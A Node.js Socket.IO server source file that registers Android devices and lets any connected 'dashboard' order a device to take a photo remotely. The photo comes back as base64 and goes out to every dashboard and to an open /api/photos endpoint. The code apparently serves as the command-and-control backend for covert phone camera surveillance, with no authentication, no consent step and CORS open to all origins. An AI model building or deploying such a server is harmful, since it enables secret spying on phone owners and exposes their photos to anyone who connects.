const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Storage
const devices = new Map(); // deviceId -> socket
const dashboards = new Map(); // socketId -> socket
const photos = []; // Array of photos

// Health check
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    devices: devices.size,
    dashboards: dashboards.size,
    photos: photos.length,
    uptime: process.uptime()
  });
});

// Get all devices
app.get('/api/devices', (req, res) => {
  const deviceList = [];
  devices.forEach((socket, deviceId) => {
    if (socket.deviceInfo) {
      deviceList.push({
        ...socket.deviceInfo,
        isOnline: true
      });
    }
  });
  res.json(deviceList);
});

// Get photos
app.get('/api/photos', (req, res) => {
  const deviceId = req.query.deviceId;
  if (deviceId) {
    res.json(photos.filter(p => p.deviceId === deviceId));
  } else {
    res.json(photos);
  }
});

io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);
  
  // Device registration
  socket.on('register_device', (data) => {
    const { deviceId, deviceName, manufacturer, model, androidVersion, battery } = data;
    
    socket.deviceId = deviceId;
    socket.deviceInfo = {
      deviceId,
      deviceName,
      manufacturer,
      model,
      androidVersion,
      battery,
      lastSeen: Date.now()
    };
    
    devices.set(deviceId, socket);
    console.log('Device registered:', deviceId, deviceName);
    
    // Broadcast device list to all dashboards
    broadcastDeviceList();
    
    socket.emit('registered', { success: true });
  });
  
  // Dashboard registration
  socket.on('register_dashboard', () => {
    dashboards.set(socket.id, socket);
    console.log('Dashboard registered:', socket.id);
    
    // Send current device list
    socket.emit('device_list', getDeviceList());
  });
  
  // Dashboard -> Device: Capture photo command
  socket.on('capture_photo', (data) => {
    const { deviceId } = data;
    const deviceSocket = devices.get(deviceId);
    
    if (deviceSocket) {
      console.log('Sending capture command to device:', deviceId);
      deviceSocket.emit('command', { type: 'capture_photo' });
    } else {
      socket.emit('error', { message: 'Device not found or offline' });
    }
  });
  
  // Device -> Dashboard: Photo upload
  socket.on('photo_upload', (data) => {
    const { deviceId, base64Data } = data;
    
    const photo = {
      photoId: `photo_${Date.now()}_${deviceId}`,
      deviceId,
      timestamp: Date.now(),
      base64Data
    };
    
    photos.push(photo);
    console.log('Photo received from device:', deviceId);
    
    // Broadcast to all dashboards
    dashboards.forEach((dashSocket) => {
      dashSocket.emit('photo_received', photo);
    });
  });
  
  // Device status update
  socket.on('status_update', (data) => {
    if (socket.deviceId) {
      socket.deviceInfo = {
        ...socket.deviceInfo,
        ...data,
        lastSeen: Date.now()
      };
      broadcastDeviceList();
    }
  });
  
  // Disconnect
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
    
    if (socket.deviceId) {
      devices.delete(socket.deviceId);
      broadcastDeviceList();
    }
    
    dashboards.delete(socket.id);
  });
});

function getDeviceList() {
  const deviceList = [];
  devices.forEach((socket, deviceId) => {
    if (socket.deviceInfo) {
      deviceList.push({
        ...socket.deviceInfo,
        isOnline: true
      });
    }
  });
  return deviceList;
}

function broadcastDeviceList() {
  const deviceList = getDeviceList();
  dashboards.forEach((dashSocket) => {
    dashSocket.emit('device_list', deviceList);
  });
}

const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📡 Socket.IO ready for connections`);
});
